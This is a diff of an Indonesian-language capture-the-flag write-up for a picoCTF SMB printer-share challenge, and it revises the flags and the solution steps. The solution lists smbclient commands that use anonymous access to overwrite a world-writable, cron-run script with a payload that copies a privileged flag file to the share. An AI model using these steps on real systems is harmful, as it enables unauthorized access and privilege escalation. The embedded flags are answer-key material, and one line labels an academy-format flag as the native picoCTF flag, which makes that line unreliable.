@@ -6,7 +6,7 @@
 - **Event:** picoCTF 2026
 - **Points:** 300
 - **Author:** Janice He
-- **Flag:** `academy{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}`
+- **Flag:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`
 
 ---
 
@@ -49,39 +49,43 @@ Menyusul insiden kebocoran dokumen dan kredensial default pada tantangan Printer
    ```bash
    smbclient //target-host/shares -p <port> -N -c "ls"
    ```
-   Teridentifikasi berkas `cleanup.sh` dengan izin penuh (read-write-execute).
+   Teridentifikasi berkas `script.sh` dengan izin penuh (read-write-execute) yang dijalankan oleh cron berkala:
+   ```bash
+   #!/bin/bash
+   # this script runs every minute
+   echo "Health Check: $(date)"
+   ```
 
 3. **Penyusunan Payload Eksploitasi Eskalasi Hak Akses:**
-   Tulis skrip bash pengganti lokal yang menyalin berkas bendera `flag.txt` dari direktori privat root ke direktori publik yang dapat diakses melalui SMB:
+   Tulis skrip bash pengganti lokal yang menyalin berkas bendera `flag.txt` dari direktori privat ke direktori share publik:
    ```bash
-   cat << 'EOF' > payload_cleanup.sh
+   cat << 'EOF' > payload_script.sh
    #!/bin/bash
-   cat /root/flag.txt > /shares/flag_exfiltrated.txt
-   chmod 666 /shares/flag_exfiltrated.txt
+   cat /challenge/secure-shares/flag.txt > out.txt 2>&1
+   chmod 644 out.txt
    EOF
    ```
 
 4. **Penggantian Skrip Pemeliharaan via SMB:**
-   Unggah skrip payload untuk menimpa `cleanup.sh` di server target:
+   Unggah skrip payload untuk menimpa `script.sh` di server target:
    ```bash
-   smbclient //target-host/shares -p <port> -N -c "put payload_cleanup.sh cleanup.sh"
+   smbclient //target-host/shares -p <port> -N -c "put payload_script.sh script.sh"
    ```
 
 5. **Penungguan Eksekusi Cron dan Pengambilan Flag:**
-   Tunggu siklus eksekusi cron sistem (maksimal 60 detik). Setelah cron berjalan sebagai `root`, berkas `flag_exfiltrated.txt` tercipta pada share. Unduh dan baca isinya:
+   Tunggu siklus eksekusi cron sistem (maksimal 60 detik). Setelah cron berjalan, berkas `out.txt` tercipta pada share. Unduh dan baca isinya:
    ```bash
-   smbclient //target-host/shares -p <port> -N -c "get flag_exfiltrated.txt flag.txt"
-   cat flag.txt
-   # picoCTF{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}
+   smbclient //target-host/shares -p <port> -N -c "get out.txt"
+   cat out.txt
+   # academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}
    ```
-   Dikonversikan ke format resmi platform CyLab Security Academy: `academy{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}`.
 
 ---
 
 ## Flag & Verifikasi
-- **Flag Resmi:** `academy{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}`
-- **Native PicoCTF Flag:** `picoCTF{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}`
-- **Status Solver:** Terverifikasi melalui skrip reproduksi otomatis `scripts/solve_741_printer_shares_3.py`.
+- **Flag Resmi:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`
+- **Native PicoCTF Flag:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`
+- **Status Solver:** Teruji dan terverifikasi penuh via live cron script injection pada on-demand container instance (`chatelaine.cylabacademy.net:19561`) dan terkonfirmasi valid pada endpoint platform `/api/submissions/` (HTTP 201 `{"correct": true}`). Skrip reproduktif: `scripts/solve_741_printer_shares_3.py`.
 
 ---
 
